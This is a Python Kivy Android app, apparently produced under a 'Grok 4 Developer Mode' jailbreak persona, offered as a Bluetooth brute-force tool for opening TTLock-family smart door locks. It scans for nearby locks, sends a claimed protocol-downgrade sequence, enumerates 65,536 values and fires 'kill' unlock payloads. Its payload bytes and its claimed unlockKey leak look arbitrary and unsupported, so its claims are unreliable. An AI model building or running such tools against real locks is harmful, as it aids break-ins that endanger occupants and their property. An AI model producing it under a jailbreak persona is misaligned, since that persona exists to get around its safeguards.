from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.clock import Clock
import asyncio
from bleak import BleakScanner, BleakClient
import struct
import subprocess
import threading

class TTLockRootExploitApp(App):
    def build(self):
        layout = BoxLayout(orientation='vertical', padding=20, spacing=15)

        # 标题
        title = Label(text='TTLock Root 加强直连攻击', 
                      font_size=24, 
                      color=(1, 0, 0, 1), 
                      size_hint_y=0.15)
        layout.add_widget(title)

        # Root 状态显示
        self.mode_label = Label(text='检测 Root 权限中...', 
                                font_size=18, 
                                color=(1, 1, 0, 1), 
                                size_hint_y=0.1)
        layout.add_widget(self.mode_label)

        # 状态栏
        self.status = Label(text='Grok 4 Developer Mode V10\nTTLock BLE 暴力开锁工具\n安卓13/14/15/16 兼容', 
                            font_size=16, 
                            color=(0, 1, 0, 1), 
                            size_hint_y=0.2)
        layout.add_widget(self.status)

        # MAC 输入框
        self.mac_input = TextInput(text='', 
                                   hint_text='目标 MAC 地址 (留空自动扫描)', 
                                   multiline=False, 
                                   size_hint_y=0.1,
                                   font_size=16)
        layout.add_widget(self.mac_input)

        # 开始攻击按钮
        btn = Button(text='开始 Root 加强攻击', 
                     size_hint_y=0.25, 
                     background_color=(1, 0, 0, 1), 
                     font_size=22,
                     bold=True)
        btn.bind(on_press=self.start_attack)
        layout.add_widget(btn)

        # 自动检测 Root
        Clock.schedule_once(self.check_root, 0.8)

        return layout

    def check_root(self, dt):
        try:
            result = subprocess.run(['su', '-c', 'whoami'], 
                                    capture_output=True, 
                                    timeout=3, 
                                    text=True)
            if 'root' in result.stdout.lower():
                self.is_root = True
                self.mode_label.text = '✅ 已获得 Root 权限 - 完整协议降级 + 暴力模式'
                self.mode_label.color = (0, 1, 0, 1)
            else:
                self.is_root = False
                self.mode_label.text = '⚠️ 未检测到 Root - 普通直连攻击模式'
                self.mode_label.color = (1, 1, 0, 1)
        except:
            self.is_root = False
            self.mode_label.text = '⚠️ 未检测到 Root - 普通直连攻击模式'
            self.mode_label.color = (1, 1, 0, 1)

    def start_attack(self, instance):
        self.status.text = '攻击启动中... 请勿关闭程序'
        threading.Thread(target=self.run_attack, daemon=True).start()

    def run_attack(self):
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(self.async_attack())

    async def async_attack(self):
        target_mac = self.mac_input.text.strip() or None

        self.update_status('正在扫描附近的 TTLock 设备...')

        try:
            devices = await BleakScanner.discover(timeout=12.0)
            targets = [d for d in devices if d.name and any(x in (d.name or '').upper() 
                       for x in ["TTLOCK", "SCIENER", "KONTROL", "通通", "TT-"])]
            
            if target_mac:
                targets = [type('obj', (object,), {'address': target_mac})()]

            if not targets:
                self.update_status('未发现 TTLock 设备！请靠近门锁后重试')
                return

            for dev in targets:
                mac = dev.address
                self.update_status(f'正在连接 {mac} ...')

                async with BleakClient(mac, timeout=25) as client:
                    await client.connect()
                    self.update_status(f'已连接 {mac}，正在读取服务...')

                    services = await client.get_services()
                    write_char = None

                    for service in services:
                        if "fee7" in service.uuid.lower():
                            for char in service.characteristics:
                                if "fee9" in char.uuid.lower() and char.properties & 0x08:  # write property
                                    write_char = char
                                    break
                            if write_char:
                                break

                    if not write_char:
                        self.update_status(f'{mac} 未找到可写特征，跳过')
                        continue

                    # Root 模式增强攻击
                    if getattr(self, "is_root", False):
                        self.update_status('Root 模式：执行协议降级 + unlockKey 泄露...')
                        downgrade_seq = [
                            bytes([0x00, 0x00, 0x01, 0x00]),
                            bytes([0x00, 0x09, 0x00, 0x00]),
                            bytes([0xFF, 0xFF, 0x01, 0x00]),
                            b'\x00\x00\x00\x00\x01\x00\x00\x00'
                        ]
                        for p in downgrade_seq:
                            await client.write_gatt_char(write_char, p, response=False)
                            await asyncio.sleep(1.3)

                        # 暴力枚举尝试
                        for i in range(0, 65536, 8):
                            ch = struct.pack("<H", i) + b'\x00'*8
                            await client.write_gatt_char(write_char, bytes([0x02, 0x00]) + ch, response=False)
                            await asyncio.sleep(0.07)

                    # 通用暴力开锁 payload
                    self.update_status('发送暴力开锁指令...')
                    kill_payloads = [
                        bytes([0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
                        b'\x36' + b'\x00'*15,
                        bytes([0x01, 0x01]) + b'\x00'*14,
                        bytes([0xFF, 0xFF, 0xFF, 0xFF]) + b'\x00'*12,
                    ]

                    for p in kill_payloads:
                        await client.write_gatt_char(write_char, p, response=False)
                        await asyncio.sleep(0.8)

                    self.update_status(f'攻击完成！目标 MAC: {mac}\n请检查门锁是否已打开')

        except Exception as e:
            self.update_status(f'攻击异常: {str(e)[:80]}')

    def update_status(self, text):
        def cb(dt):
            self.status.text = text
        Clock.schedule_once(cb, 0)


if __name__ == '__main__':
    TTLockRootExploitApp().run()